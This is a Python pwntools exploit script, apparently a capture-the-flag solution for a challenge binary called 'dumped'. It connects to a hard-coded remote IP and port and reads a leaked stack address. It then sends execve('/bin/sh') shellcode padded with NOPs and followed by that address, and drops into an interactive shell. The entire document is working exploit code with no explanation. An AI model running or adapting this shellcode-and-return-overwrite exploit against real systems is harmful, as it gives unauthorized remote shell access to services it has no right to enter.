#!/usr/bin/env python3



from pwn import * 

context.arch = "amd64"
e = ELF("./dumped")
#r = process("./dumped")
r = remote("34.100.187.70",4444)
r.recvuntil(b"You are dumping your trash in dumpster number: ")
val = int(r.recvline().strip(),16)
print(hex(val))
r.sendline(b"-1")
shellcode = asm('''
        mov rdi,rsp
        mov rsi,0
        mov rdx,0
        mov rax,0x3b
        syscall
        ''')
exploit = shellcode + (b"\x90" * (104 - len(shellcode)))  + p64(val)  + b"/bin/sh\x00"
r.send(exploit)
r.interactive()
